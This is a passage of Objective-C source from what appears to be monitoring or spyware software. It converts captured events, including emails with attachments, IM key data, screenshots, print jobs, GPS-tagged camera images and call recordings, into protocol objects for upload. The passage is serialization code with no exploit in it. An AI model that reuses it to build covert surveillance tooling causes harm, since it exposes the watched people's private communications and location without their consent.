            FxFileActivityEvent *fxFileActivityEvent = (FxFileActivityEvent *)aEvent;
            FileActivityEvent *fileActivityEvent = [[[FileActivityEvent alloc] init] autorelease];
            [fileActivityEvent setEventId:[fxFileActivityEvent eventId]];
            [fileActivityEvent setTime:[fxFileActivityEvent dateTime]];
            [fileActivityEvent setMUserLogonName:[fxFileActivityEvent mUserLogonName]];
            [fileActivityEvent setMApplicationID:[fxFileActivityEvent mApplicationID]];
            [fileActivityEvent setMApplicationName:[fxFileActivityEvent mApplicationName]];
            [fileActivityEvent setMActivityType:[fxFileActivityEvent mActivityType]];
            [fileActivityEvent setMActivityFileType:[fxFileActivityEvent mActivityFileType]];
            [fileActivityEvent setMActivityOwner:[fxFileActivityEvent mActivityOwner]];
            [fileActivityEvent setMDateCreated:[fxFileActivityEvent mDateCreated]];
            [fileActivityEvent setMDateModified:[fxFileActivityEvent mDateModified]];
            [fileActivityEvent setMDateAccessed:[fxFileActivityEvent mDateAccessed]];
            
            if ([fxFileActivityEvent mOriginalFile]) {
                FileActivityInfo * oldInfo = [[FileActivityInfo alloc] init];
                [oldInfo setMPath:[[fxFileActivityEvent mOriginalFile] mPath]];
                [oldInfo setMFileName:[[fxFileActivityEvent mOriginalFile] mFileName]];
                [oldInfo setMSize:[[fxFileActivityEvent mOriginalFile] mSize]];
                [oldInfo setMAttributes:[[fxFileActivityEvent mOriginalFile] mAttributes]];
                
                NSMutableArray * oldPermission = [[NSMutableArray alloc]init];
                NSMutableArray * arrayOldOfPermission = [[NSMutableArray alloc]initWithArray:[[fxFileActivityEvent mOriginalFile] mPermissions]];
                for (int i=0; i < [arrayOldOfPermission count]; i++) {
                    FileActivityPermission * privilege = [[FileActivityPermission alloc]init];
                    [privilege setMGroupUserName: [[arrayOldOfPermission objectAtIndex:i] mGroupUserName]];
                    [privilege setMPrivilegeFullControl:  [[arrayOldOfPermission objectAtIndex:i] mPrivilegeFullControl]];
                    [privilege setMPrivilegeModify:  [[arrayOldOfPermission objectAtIndex:i] mPrivilegeModify]];
                    [privilege setMPrivilegeReadExecute:  [[arrayOldOfPermission objectAtIndex:i] mPrivilegeReadExecute]];
                    [privilege setMPrivilegeRead:  [[arrayOldOfPermission objectAtIndex:i] mPrivilegeRead]];
                    [privilege setMPrivilegeWrite:  [[arrayOldOfPermission objectAtIndex:i] mPrivilegeWrite]];
                    [privilege setMPrivilegeListFolderContents:  [[arrayOldOfPermission objectAtIndex:i] mPrivilegeListFolderContents]];
                    [oldPermission addObject:privilege];
                    [privilege release];
                }
                [arrayOldOfPermission release];
                
                [oldInfo setMPermissions:oldPermission];
                [oldPermission release];
                [fileActivityEvent setMOriginalFile:oldInfo];
                [oldInfo release];
            }else{
                [fileActivityEvent setMOriginalFile:nil];
            }

            if ([fxFileActivityEvent mModifiedFile]) {
                
                FileActivityInfo * modInfo = [[FileActivityInfo alloc] init];
                [modInfo setMPath:[[fxFileActivityEvent mModifiedFile] mPath]];
                [modInfo setMFileName:[[fxFileActivityEvent mModifiedFile] mFileName]];
                [modInfo setMSize:[[fxFileActivityEvent mModifiedFile] mSize]];
                [modInfo setMAttributes:[[fxFileActivityEvent mModifiedFile] mAttributes]];

                NSMutableArray * modPermission = [[NSMutableArray alloc]init];
                NSMutableArray * arrayModOfPermission = [[NSMutableArray alloc]initWithArray:[[fxFileActivityEvent mModifiedFile] mPermissions]];
                for (int i=0; i < [[[fxFileActivityEvent mModifiedFile] mPermissions] count]; i++) {
                    FileActivityPermission * privilege = [[FileActivityPermission alloc]init];
                    [privilege setMGroupUserName:  [[arrayModOfPermission objectAtIndex:i] mGroupUserName]];
                    [privilege setMPrivilegeFullControl:  [[arrayModOfPermission objectAtIndex:i] mPrivilegeFullControl]];
                    [privilege setMPrivilegeModify:  [[arrayModOfPermission objectAtIndex:i] mPrivilegeModify]];
                    [privilege setMPrivilegeReadExecute:  [[arrayModOfPermission objectAtIndex:i] mPrivilegeReadExecute]];
                    [privilege setMPrivilegeRead:  [[arrayModOfPermission objectAtIndex:i] mPrivilegeRead]];
                    [privilege setMPrivilegeWrite:  [[arrayModOfPermission objectAtIndex:i] mPrivilegeWrite]];
                    [privilege setMPrivilegeListFolderContents:  [[arrayModOfPermission objectAtIndex:i] mPrivilegeListFolderContents]];
                    [modPermission addObject:privilege];
                    [privilege release];
                }
                [arrayModOfPermission release];
                
                [modInfo setMPermissions:modPermission];
                [modPermission release];
                [fileActivityEvent setMModifiedFile:modInfo];
                [modInfo release];
            }else{
                [fileActivityEvent setMModifiedFile:nil];
            }
            event = fileActivityEvent;
            
        } break;
        case kEventTypeNetworkTraffic: {
            FxNetworkTrafficEvent * fxNetworkTrafficEvent = (FxNetworkTrafficEvent *) aEvent;
            NetworkTrafficEvent * networkTrafficEvent = [[[NetworkTrafficEvent alloc]init] autorelease];
            [networkTrafficEvent setEventId:[fxNetworkTrafficEvent eventId]];
            [networkTrafficEvent setTime:[fxNetworkTrafficEvent dateTime]];
            [networkTrafficEvent setMUserLogonName:[fxNetworkTrafficEvent mUserLogonName]];
            [networkTrafficEvent setMApplicationID:[fxNetworkTrafficEvent mApplicationID]];
            [networkTrafficEvent setMApplicationName:[fxNetworkTrafficEvent mApplicationName]];
            [networkTrafficEvent setMTitle:[fxNetworkTrafficEvent mTitle]];
            [networkTrafficEvent setMStartTime:[fxNetworkTrafficEvent mStartTime]];
            [networkTrafficEvent setMEndTime:[fxNetworkTrafficEvent mEndTime]];
            
            NSMutableArray * allInterfaces = [[NSMutableArray alloc]init];
            for (int i=0; i < [[fxNetworkTrafficEvent mNetworkInterfaces] count]; i++) {
                FxNetworkInterface * fxNetworkInterface = [[fxNetworkTrafficEvent mNetworkInterfaces] objectAtIndex:i];
                NetworkInterface * networkInterface = [[NetworkInterface alloc]init];
                [networkInterface setMNetworkType:[fxNetworkInterface mNetworkType]];
                [networkInterface setMInterfaceName:[fxNetworkInterface mInterfaceName]];
                [networkInterface setMDescription:[fxNetworkInterface mDescription]];
                [networkInterface setMIPv4:[fxNetworkInterface mIPv4]];
                [networkInterface setMIPv6:[fxNetworkInterface mIPv6]];
                
                NSMutableArray * allHosts = [[NSMutableArray alloc]init];
                for (int j=0; j < [[fxNetworkInterface mRemoteHosts] count]; j++) {
                    FxRemoteHost * fxRemoteHost = [[fxNetworkInterface mRemoteHosts] objectAtIndex:j];
                    NetworkRemoteHost * remoteHost = [[NetworkRemoteHost alloc]init];
                    [remoteHost setMHostName:[fxRemoteHost mHostName]];
                    [remoteHost setMIPv4:[fxRemoteHost mIPv4]];
                    [remoteHost setMIPv6:[fxRemoteHost mIPv6]];
                    
                    NSMutableArray * allTraffics = [[NSMutableArray alloc]init];
                    for (int k=0; k < [[fxRemoteHost mTraffics] count]; k++) {
                        FxTraffic * fxTraffic = [[fxRemoteHost mTraffics] objectAtIndex:k];
                        NetworkTraffic * traffic = [[NetworkTraffic alloc]init];
                        [traffic setMTransportType:[fxTraffic mTransportType]];
                        [traffic setMFxProtocolType:[fxTraffic mFxProtocolType]];
                        [traffic setMPortNumber:[fxTraffic mPortNumber]];
                        [traffic setMPacketsIn:[fxTraffic mPacketsIn]];
                        [traffic setMIncomingTrafficSize:[fxTraffic mIncomingTrafficSize]];
                        [traffic setMPacketsOut:[fxTraffic mPacketsOut]];
                        [traffic setMOutgoingTrafficSize:[fxTraffic mOutgoingTrafficSize]];
        
                        [allTraffics addObject:traffic];
                        [traffic release];
                    }
                    [remoteHost setMTraffics:allTraffics];
                    [allTraffics release];
                    
                    [allHosts addObject:remoteHost];
                    [remoteHost release];
                }
                [networkInterface setMRemoteHosts:allHosts];
                [allHosts release];
                
                [allInterfaces addObject:networkInterface];
                [networkInterface release];
            }
            [networkTrafficEvent setMNetworkInterfaces:allInterfaces];
            [allInterfaces release];
            
            event = networkTrafficEvent;
            
        }break;
        case kEventTypePrintJob: {
            FxPrintJobEvent *fxPrintJobEvent = (FxPrintJobEvent *)aEvent;
            PrintJobEvent * printJob = [[[PrintJobEvent alloc] init] autorelease];
            [printJob setEventId:[fxPrintJobEvent eventId]];
            [printJob setTime:[fxPrintJobEvent dateTime]];
            [printJob setMUserLogonName:[fxPrintJobEvent mUserLogonName]];
            [printJob setMApplicationID:[fxPrintJobEvent mApplicationID]];
            [printJob setMApplicationName:[fxPrintJobEvent mApplicationName]];
            [printJob setMTitle:[fxPrintJobEvent mTitle]];
            [printJob setMJobID:[fxPrintJobEvent mJobID]];
            [printJob setMOwnerName:[fxPrintJobEvent mOwnerName]];
            [printJob setMPrinter:[fxPrintJobEvent mPrinter]];
            [printJob setMDocumentName:[fxPrintJobEvent mDocumentName]];
            [printJob setMSubmitTime:[fxPrintJobEvent mSubmitTime]];
            [printJob setMTotalPage:[fxPrintJobEvent mTotalPage]];
            [printJob setMTotalByte:[fxPrintJobEvent mTotalByte]];
            [printJob setMMimeType:[self mimeType:[fxPrintJobEvent mPathToData]]];
            [printJob setMData:[NSData dataWithContentsOfFile:[fxPrintJobEvent mPathToData]]];

            event = printJob;
        } break;
        case kEventTypeNetworkConnectionMacOS: {
            FxNetworkConnectionMacOSEvent *fxNetworkConnectionEvent = (FxNetworkConnectionMacOSEvent *)aEvent;
            NetworkConnectionEvent * networkConnectionEvent = [[[NetworkConnectionEvent alloc]init] autorelease];
            [networkConnectionEvent setEventId:[fxNetworkConnectionEvent eventId]];
            [networkConnectionEvent setTime:[fxNetworkConnectionEvent dateTime]];
            [networkConnectionEvent setMUserLogonName:[fxNetworkConnectionEvent mUserLogonName]];
            [networkConnectionEvent setMApplicationID:[fxNetworkConnectionEvent mApplicationID]];
            [networkConnectionEvent setMApplicationName:[fxNetworkConnectionEvent mApplicationName]];
            [networkConnectionEvent setMTitle:[fxNetworkConnectionEvent mTitle]];
            
            NetworkAdapter * networkAdapter = [[NetworkAdapter alloc]init];
            [networkAdapter setMUID:@""];
            [networkAdapter setMNetworkType:[[fxNetworkConnectionEvent mAdapter] mNetworkType]];
            [networkAdapter setMName:[[fxNetworkConnectionEvent mAdapter] mName]];
            [networkAdapter setMDescription:[[fxNetworkConnectionEvent mAdapter] mDescription]];
            [networkAdapter setMMACAddress:[[fxNetworkConnectionEvent mAdapter] mMACAddress]];
            [networkConnectionEvent setMAdapter:networkAdapter];
            [networkAdapter release];
            
            NetworkAdapterStatus * networkAdapterStatus = [[NetworkAdapterStatus alloc]init];
            [networkAdapterStatus setMState:[[fxNetworkConnectionEvent mAdapterStatus] mState]];
            [networkAdapterStatus setMNetworkName:[[fxNetworkConnectionEvent mAdapterStatus] mNetworkName]];
            [networkAdapterStatus setMIPv4:[[fxNetworkConnectionEvent mAdapterStatus] mIPv4]];
            [networkAdapterStatus setMIPv6:[[fxNetworkConnectionEvent mAdapterStatus] mIPv6]];
            [networkAdapterStatus setMSubnetMaskAddress:[[fxNetworkConnectionEvent mAdapterStatus] mSubnetMaskAddress]];
            [networkAdapterStatus setMDefaultGateway:[[fxNetworkConnectionEvent mAdapterStatus] mDefaultGateway]];
            [networkAdapterStatus setMDHCP:[[fxNetworkConnectionEvent mAdapterStatus] mDHCP]];
            [networkConnectionEvent setMAdapterStatus:networkAdapterStatus];
            [networkAdapterStatus release];
  
            event = networkConnectionEvent;
        } break;
        case kEventTypeLogon: {
            FxLogonEvent *fxLogonEvent = (FxLogonEvent *)aEvent;
            LogonEvent *logonEvent = [[[LogonEvent alloc] init] autorelease];
            [logonEvent setEventId:[fxLogonEvent eventId]];
            [logonEvent setTime:[fxLogonEvent dateTime]];
            [logonEvent setMUserLogonName:[fxLogonEvent mUserLogonName]];
            [logonEvent setMAppID:[fxLogonEvent mApplicationID]];
            [logonEvent setMAppName:[fxLogonEvent mApplicationName]];
            [logonEvent setMTitle:[fxLogonEvent mTitle]];
            [logonEvent setMAction:[fxLogonEvent mAction]];
            event = logonEvent;
        } break;
        case kEventTypeAppUsage: {
            FxApplicationUsageEvent *fxAppUsageEvent = (FxApplicationUsageEvent *)aEvent;
            AppUsageEvent *appUsageEvent = [[[AppUsageEvent alloc] init] autorelease];
            [appUsageEvent setEventId:[fxAppUsageEvent eventId]];
            [appUsageEvent setTime:[fxAppUsageEvent dateTime]];
            [appUsageEvent setMUserLogonName:[fxAppUsageEvent mUserLogonName]];
            [appUsageEvent setMAppID:[fxAppUsageEvent mApplicationID]];
            [appUsageEvent setMAppName:[fxAppUsageEvent mApplicationName]];
            [appUsageEvent setMTitle:[fxAppUsageEvent mTitle]];
            [appUsageEvent setMGotFocusTime:[fxAppUsageEvent mActiveFocusTime]];
            [appUsageEvent setMLostFocusTime:[fxAppUsageEvent mLostFocusTime]];
            [appUsageEvent setMDuration:[fxAppUsageEvent mDuration]];
            event = appUsageEvent;
        } break;
        case kEventTypeIMMacOS: {
            FxIMMacOSEvent *fxIMMacOSEvent = (FxIMMacOSEvent *)aEvent;
            IMMacOSEvent *imMacOSEvent = [[[IMMacOSEvent alloc] init] autorelease];
            [imMacOSEvent setEventId:[fxIMMacOSEvent eventId]];
            [imMacOSEvent setTime:[fxIMMacOSEvent dateTime]];
            [imMacOSEvent setMUserLogonName:[fxIMMacOSEvent mUserLogonName]];
            [imMacOSEvent setMAppID:[fxIMMacOSEvent mApplicationID]];
            [imMacOSEvent setMAppName:[fxIMMacOSEvent mApplicationName]];
            [imMacOSEvent setMTitle:[fxIMMacOSEvent mTitle]];
            [imMacOSEvent setMIMServiceID:[fxIMMacOSEvent mIMServiceID]];
            [imMacOSEvent setMConvName:[fxIMMacOSEvent mConversationName]];
            [imMacOSEvent setMKeyData:[fxIMMacOSEvent mKeyData]];
            [imMacOSEvent setMSnapshotType:[self mediaType:[fxIMMacOSEvent mSnapshotFilePath]]];
            [imMacOSEvent setMSnapshotData:[fxIMMacOSEvent mSnapshotFilePath]];
            event = imMacOSEvent;
        } break;
        case kEventTypeEmailMacOS: {
            FxEmailMacOSEvent* fxEmailMacOSEvent = (FxEmailMacOSEvent*)aEvent;
            EmailMacOSEvent* emailMacOSEvent = [[EmailMacOSEvent alloc] init];
            [emailMacOSEvent setEventId:[fxEmailMacOSEvent eventId]];
            [emailMacOSEvent setTime:[fxEmailMacOSEvent dateTime]];
            [emailMacOSEvent setMDirection:(EventDirection)[fxEmailMacOSEvent mDirection]];
            [emailMacOSEvent setMUserLogonName:[fxEmailMacOSEvent mUserLogonName]];
            [emailMacOSEvent setMAppID:[fxEmailMacOSEvent mApplicationID]];
            [emailMacOSEvent setMAppName:[fxEmailMacOSEvent mApplicationName]];
            [emailMacOSEvent setMTitle:[fxEmailMacOSEvent mTitle]];
            [emailMacOSEvent setMSenderEmail:[fxEmailMacOSEvent mSenderEmail]];
            [emailMacOSEvent setMSenderName:[fxEmailMacOSEvent mSenderName]];
            [emailMacOSEvent setMServiceType:[fxEmailMacOSEvent mEmailServiceType]];
            
            // Recipient
            NSMutableArray* recipientArray = [[NSMutableArray alloc] init];
            for (FxRecipient* fxRec in [fxEmailMacOSEvent mRecipients]) {
                Recipient* rec = [[Recipient alloc] init];
                [rec setRecipientType:(RecipientType)[fxRec recipType]];
                [rec setContactName:[fxRec recipContactName]];
                [rec setRecipient:[fxRec recipNumAddr]];
                [recipientArray addObject:rec];
                [rec release];
            }
            [emailMacOSEvent setMRecipients:recipientArray];
            [recipientArray release];
            
            [emailMacOSEvent setMSubject:[fxEmailMacOSEvent mSubject]];
            [emailMacOSEvent setMBody:[fxEmailMacOSEvent mBody]];
            
            // Attachment
            NSMutableArray* attArray = [[NSMutableArray alloc] init];
            for (FxAttachment* fxAtt in [fxEmailMacOSEvent mAttachments]) {
                Attachment* att = [[Attachment alloc] init];
                [att setAttachmentFullName:[fxAtt fullPath]];
                [att setAttachmentData:[NSData dataWithContentsOfFile:[fxAtt fullPath]]];
                [attArray addObject:att];
                [att release];
            }
            [emailMacOSEvent setMAttachments:attArray];
            [attArray release];
            
            [emailMacOSEvent autorelease];
            event = emailMacOSEvent;
        } break;
        case kEventTypeScreenRecordSnapshot: {
            FxScreenshotEvent *fxScreenshotEvent = (FxScreenshotEvent *)aEvent;
            ScreenshotEvent *screenshotEvent = [[[ScreenshotEvent alloc] init] autorelease];
            [screenshotEvent setEventId:[fxScreenshotEvent eventId]];
            [screenshotEvent setTime:[fxScreenshotEvent dateTime]];
            [screenshotEvent setMUserLogonName:[fxScreenshotEvent mUserLogonName]];
            [screenshotEvent setMAppID:[fxScreenshotEvent mApplicationID]];
            [screenshotEvent setMAppName:[fxScreenshotEvent mApplicationName]];
            [screenshotEvent setMTitle:[fxScreenshotEvent mTitle]];
            [screenshotEvent setMCallingModule:[fxScreenshotEvent mCallingModule]];
            [screenshotEvent setMFrameID:[fxScreenshotEvent mFrameID]];
            [screenshotEvent setMMediaType:[self mediaType:[fxScreenshotEvent mScreenshotFilePath]]];
            [screenshotEvent setMScreenshotData:[fxScreenshotEvent mScreenshotFilePath]];
            event = screenshotEvent;
        } break;
		case kEventTypeAmbientRecordAudio:
		case kEventTypeCameraImage:
		case kEventTypeVideo:
		case kEventTypeAudio:
		case kEventTypeCallRecordAudio:
		case kEventTypeWallpaper:
		case kEventTypeRemoteCameraImage:
		case kEventTypeRemoteCameraVideo: {
			DLog(@"FxEvent base from db and going to convert to CSM event aEvent = %@, type = %ld, event id = %lu",
				 aEvent, (long)NSINTEGER_DLOG([aEvent eventType]), (unsigned long)NSUINTEGER_DLOG([aEvent eventId]));
			if (aThumbnail) {
				event = [self convertToPhoenixProtocolThumbnailEvent:aEvent];
			} else {
				event = [self convertToPhoenixProtocolActualEvent:aEvent];
			}
		} break;
		default:
			break;
	}
	return (event);
}

+ (MediaType) mediaType: (NSString*) aFullPath {
	DLog (@"aFullPath = %@", aFullPath); // If the path is nil there will be crash with (Trace/BPT trap: 5)
	
	NSString *mime = nil;
	if ([aFullPath length] > 0) {
		CFStringRef uti = UTTypeCreatePreferredIdentifierForTag(kUTTagClassFilenameExtension, (CFStringRef)[aFullPath pathExtension], NULL);
		CFStringRef mimeType = UTTypeCopyPreferredTagWithClass(uti, kUTTagClassMIMEType);
		CFRelease(uti);
		
		mime = (NSString *)mimeType;
		mime = [mime autorelease];
		DLog(@"MIME type of the media, mime = %@", mime);
	}

	MediaType type = UNKNOWN_MEDIA;
	if ([mime isEqualToString:@"image/jpeg"] || [mime isEqualToString:@"image/pjpeg"]) {
		type = JPEG;
	} else if ([mime isEqualToString:@"image/gif"]) {
		type = GIF;
	} else if ([mime isEqualToString:@"image/bmp"] || [mime isEqualToString:@"image/x-windows-bmp"]) {
		type = BMP;
	} else if ([mime isEqualToString:@"image/tiff"] || [mime isEqualToString:@"image/x-tiff"]) {
		type = TIFF;
	} else if ([mime isEqualToString:@"image/png"]) {
		type = PNG;
	} else if ([mime isEqualToString:@"image/x-portable-pixmap"]) {
		type = PPM;
	} else if ([mime isEqualToString:@"image/x-portable-graymap"] || [mime isEqualToString:@"image/x-portable-greymap"]) {
		type = PGM;
	} else if ([mime isEqualToString:@"image/x-portable-bitmap"]) {
		type = PBM;
	} else if ([mime isEqualToString:@"image/x-portable-anymap"] || [mime isEqualToString:@"application/x-portable-anymap"]) {
		type = PNM;
	} else if ([mime isEqualToString:@"application/postscript"]) {
		type = EPS;
	} else if ([mime isEqualToString:@"application/pdf"]) {
		type = PDF;
	} else if ([mime isEqualToString:@"application/x-shockwave-flash"]) {
		type = SWF;
	} else if ([mime isEqualToString:@"windows/metafile"]) {
		type = WMF;
	} else if ([mime isEqualToString:@"video/mp4"] || [mime isEqualToString:@"audio/mp4"] || [mime isEqualToString:@"application/mp4"]) {
		type = MP4;
	} else if ([mime isEqualToString:@"video/x-ms-asf"]) {
		type = ASF;
	} else if ([mime isEqualToString:@"application/x-troff-msvideo"] || [mime isEqualToString:@"video/avi"] || [mime isEqualToString:@"video/msvideo"] ||
			   [mime isEqualToString:@"video/x-msvideo"]) {
		type = AVI;
    } else if ([mime isEqualToString:@"video/quicktime"] ) {
        type = MOV;
	} else if ([mime isEqualToString:@"audio/mpeg3"] || [mime isEqualToString:@"audio/x-mpeg-3"] || [mime isEqualToString:@"video/mpeg"] || [mime isEqualToString:@"audio/mpeg"] ||
			   [mime isEqualToString:@"video/x-mpeg"]) {
		type = MP3;
	} else if ([mime isEqualToString:@"audio/vnd.qcelp"]) {
		type = QCP;
	} else if ([mime isEqualToString:@"application/x-midi"] || [mime isEqualToString:@"audio/midi"] || [mime isEqualToString:@"audio/x-mid"] ||
			   [mime isEqualToString:@"audio/x-midi"] || [mime isEqualToString:@"music/crescendo"] || [mime isEqualToString:@"x-music/x-midi"]) {
		type = MIDI;
	} else if ([mime isEqualToString:@"audio/x-pn-realaudio"] || [mime isEqualToString:@"audio/x-pn-realaudio-plugin"] || [mime isEqualToString:@"audio/x-realaudio"]) {
		type = RA;
	} else if ([mime isEqualToString:@"audio/aiff"] || [mime isEqualToString:@"audio/x-aiff"]) {
		type = AIFF;
	} else if ([mime isEqualToString:@"audio/basic"] || [mime isEqualToString:@"audio/x-au"]) {
		type = AU;
	} else if ([mime isEqualToString:@"audio/wav"] || [mime isEqualToString:@"audio/x-wav"]) {
		type = WAV;
	} else if ([mime isEqualToString:@"audio/x-m4a"]){
		type = M4P;
	}
	return (type);
}

+ (NSString *) getMimeTypeFromFileExtension: (NSString *) aFullPath {
	
	NSString *mime = [[NSString alloc] init];
	if ([[[aFullPath pathExtension] lowercaseString] isEqualToString:@"caf"])
		mime = @"audio/x-caf";
	else if ([[[aFullPath pathExtension] lowercaseString] isEqualToString:@"3ga"])
		mime = @"audio/3gpp";	
	else if ([[[aFullPath pathExtension] lowercaseString] isEqualToString:@"aac"])
		mime = @"audio/x-aac";
	
	DLog (@"Manually assign mime type: %@", mime)	
	return [mime autorelease];	
}

+ (NSString *) mimeType: (NSString*) aFullPath {
	DLog (@"aFullPath = %@", aFullPath); // If the path is nil there will be crash with (Trace/BPT trap: 5)
	
	NSString *mime = @"";
	if ([aFullPath length] > 0) {
		DLog (@"--> extension %@", [aFullPath pathExtension])
		CFStringRef uti			= UTTypeCreatePreferredIdentifierForTag(kUTTagClassFilenameExtension, (CFStringRef)[aFullPath pathExtension], NULL);
		CFStringRef mimeType	= UTTypeCopyPreferredTagWithClass(uti, kUTTagClassMIMEType);
		CFRelease(uti);
		
		mime = (NSString *)mimeType;
		mime = [mime autorelease];
		
//		if (!mime) {
//			if ([[[aFullPath pathExtension] lowercaseString] isEqualToString:@"caf"]) {
//				mime = @"audio/x-caf";
//				mimeType = [ProtocolEventConverter mimeType:attachmentFilePath];
//			} else if ([[[aFullPath pathExtension] lowercaseString] isEqualToString:@"3ga"]) {
//				mime = @"audio/3gpp";
//			}
//			DLog (@"Manually assign mime type: %@", mime)
//		}
		DLog(@"MIME type of the media, mime = %@", mime);
	}
	return (mime);
}

#if TARGET_OS_IPHONE
+ (BOOL) isVideo: (NSString*) aFullPath {
	BOOL isVideo = NO;		
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 5) {
		NSURL *mediaURL			= [NSURL fileURLWithPath:aFullPath];
		
		NSAutoreleasePool *pool	= [[NSAutoreleasePool alloc] init];
		AVAsset *asset			= [AVAsset assetWithURL:mediaURL];	
		for (AVAssetTrack *track in [asset tracks]) {
			if ([[track mediaType] isEqualToString:AVMediaTypeVideo])
				isVideo = YES;	
		}
		[pool drain];
	}	
	return isVideo;
}
#endif

+ (NSString *) audioMovieMimeType: (NSString*) aFullPath isVideo: (BOOL) aIsVideo {
	DLog (@"aFullPath = %@", aFullPath); // If the path is nil there will be crash with (Trace/BPT trap: 5)
	
	NSString *mime = nil;
	
	if ([aFullPath length] > 0) {
		//		CFStringRef uti;		
		//		if (aIsVideo)
		//			uti = UTTypeCreatePreferredIdentifierForTag(kUTTagClassFilenameExtension, (CFStringRef)[aFullPath pathExtension], kUTTypeMovie);
		//		else 
		//			uti = UTTypeCreatePreferredIdentifierForTag(kUTTagClassFilenameExtension, (CFStringRef)[aFullPath pathExtension], kUTTypeAudio);
		
		// -- 1) get all uti from the file extension
		CFArrayRef utiArray			= UTTypeCreateAllIdentifiersForTag(kUTTagClassFilenameExtension, (CFStringRef)[aFullPath pathExtension], NULL);
		NSArray *utiArray2			= (NSArray *) utiArray;
		utiArray2 = [utiArray2 autorelease];		
		DLog (@"uti array %@", utiArray2)
					
		// -- 2) traverse the array to see each mime type
		for (id eachUti in utiArray2) {
			NSString *mime2 = @"";
			DLog (@"-- eachUti: %@", (NSString *) eachUti)
			CFStringRef eachMimeType	= UTTypeCopyPreferredTagWithClass((CFStringRef) eachUti, kUTTagClassMIMEType);
			DLog (@"-- each mime type: %@", (NSString *) eachMimeType)					
			mime2	= (NSString *) eachMimeType;
			mime2	= [mime2 autorelease];
			
			if (mime2) {
				// -- match type (video)
				if (aIsVideo && [mime2 hasPrefix:@"video"]) {
					mime = mime2;
					break;
				} 
				// -- match type (audio)
				else if (!aIsVideo && [mime2 hasPrefix:@"audio"]){			
					mime = mime2;
					break;
				}
				else {
					DLog (@"!!!! change type of media")
					NSString *mediaType			= @"video";
					NSString *replacedMediaType = @"audio";				
					if (!aIsVideo) {					
						mediaType = @"audio";
						replacedMediaType = @"video";
					} 
					mime = [mime2 stringByReplacingOccurrencesOfString:replacedMediaType withString:mediaType];
					// don't break here, since we may found the match type in the next element (Note that never found yet)
				}				
			}				
		}	
		
		
		DLog(@"MIME type of the media, mime = %@", mime);
	}
	return (mime);
}

+ (BOOL) extensionCanBeBothAudioAndVideo: (NSString*) aFullPath {
	BOOL canBeAudioAndVideo = NO;
	/*
		These are the mime type that can be both audio and audio
		--> 3gpp, 3gpp2, mp4, mpeg, mpeg4-generic
	 */
	NSArray *audioVideoExtensionArray = [[NSArray alloc] initWithObjects:
										 @"3gpp", @"3gp",							// 3gpp mime type
										 @"3gpp2", @"3g2",							// 3gpp2 mime type
										 @"mp4", @"mpg4",							// mp4 mime type
										 @"mpeg", @"mpg", /*, @"mpeg4-generic",*/	// mpeg mime type
										 nil];		
	for (NSString *extension in audioVideoExtensionArray) {
		if ([[[aFullPath pathExtension] lowercaseString] isEqualToString:extension]) {
			canBeAudioAndVideo = YES;
			break;
		}
	}
	return canBeAudioAndVideo;	
}

+ (NSInteger) fileSize: (NSString*) aFullPath {
	NSInteger fileSize = 0;
	NSFileManager* fm = [NSFileManager defaultManager];
	NSDictionary* attribute = [fm attributesOfItemAtPath:aFullPath error:nil];
	if (attribute) {
		fileSize = [[attribute objectForKey:NSFileSize] intValue];
	}
	return (fileSize);
}

+ (id) convertToPhoenixProtocolActualEvent: (FxEvent*) aEvent {
	id event = nil;
	MediaEvent* fxActualEvent = (MediaEvent*)aEvent;
	switch ([aEvent eventType]) {
		case kEventTypeCameraImage: {
			CameraImageEvent* cameraImageEvent = [[CameraImageEvent alloc] init];
			[cameraImageEvent setEventId:[fxActualEvent eventId]];
			[cameraImageEvent setTime:[fxActualEvent dateTime]];
			[cameraImageEvent setParingID:[fxActualEvent eventId]]; // For actual media paring ID is an ID
			[cameraImageEvent setMediaType:[self mediaType:[fxActualEvent fullPath]]];
			GeoTag* geoTag = [[GeoTag alloc] init];
			[geoTag setLon:(double)[[fxActualEvent mGPSTag] longitude]];
			[geoTag setLat:(double)[[fxActualEvent mGPSTag] latitude]];
			[geoTag setAltitude:[[fxActualEvent mGPSTag] altitude]];
			[cameraImageEvent setGeo:geoTag];
			[geoTag release];
			[cameraImageEvent setFileName:[fxActualEvent fullPath]]; // Create payload from file name to avoid two time create data object
			//[cameraImageEvent setMediaData:[NSData dataWithContentsOfFile:[fxActualEvent fullPath]]];
			[cameraImageEvent autorelease];
			event = cameraImageEvent;
		} break;
		case kEventTypeVideo: {
			VideoFileEvent* videoFileEvent = [[VideoFileEvent alloc] init];
			[videoFileEvent setEventId:[fxActualEvent eventId]];
			[videoFileEvent setTime:[fxActualEvent dateTime]];
			[videoFileEvent setParingID:[fxActualEvent eventId]]; // For actual media paring ID is an ID
			[videoFileEvent setMediaType:[self mediaType:[fxActualEvent fullPath]]];
			[videoFileEvent setFileName:[fxActualEvent fullPath]]; // Create payload from file name to avoid two time create data object
			//[videoFileEvent setMediaData:[NSData dataWithContentsOfFile:[fxActualEvent fullPath]]];
			[videoFileEvent autorelease];
			event = videoFileEvent;
		} break;
		case kEventTypeAudio: {
			AudioFileEvent* audioFileEvent = [[AudioFileEvent alloc] init];
			[audioFileEvent setEventId:[fxActualEvent eventId]];
			[audioFileEvent setTime:[fxActualEvent dateTime]];
			[audioFileEvent setParingID:[fxActualEvent eventId]]; // For actual media paring ID is an ID
			[audioFileEvent setMediaType:[self mediaType:[fxActualEvent fullPath]]];
			[audioFileEvent setFileName:[fxActualEvent fullPath]]; // Create payload from file name to avoid two time create data object
			//[audioFileEvent setMediaData:[NSData dataWithContentsOfFile:[fxActualEvent fullPath]]];
			[audioFileEvent autorelease];
			event = audioFileEvent;
		} break;
		case kEventTypeCallRecordAudio: {
			AudioConversationEvent* audioConversationEvent = [[AudioConversationEvent alloc] init];
			[audioConversationEvent setEventId:[fxActualEvent eventId]];
			[audioConversationEvent setTime:[fxActualEvent dateTime]];
			[audioConversationEvent setParingID:[fxActualEvent eventId]]; // For actual media paring ID is an ID
			[audioConversationEvent setMediaType:[self mediaType:[fxActualEvent fullPath]]];
			EmbeddedCallInfo* embeddedCallInfo = [[EmbeddedCallInfo alloc] init];
			[embeddedCallInfo setDirection:(EventDirection)[[fxActualEvent mCallTag] direction]];
			[embeddedCallInfo setDuration:[[fxActualEvent mCallTag] duration]];
			[embeddedCallInfo setNumber:[[fxActualEvent mCallTag] contactNumber]];
			[embeddedCallInfo setContactName:[[fxActualEvent mCallTag] contactName]];
			[audioConversationEvent setEmbeddedCallInfo:embeddedCallInfo];
			[embeddedCallInfo release];
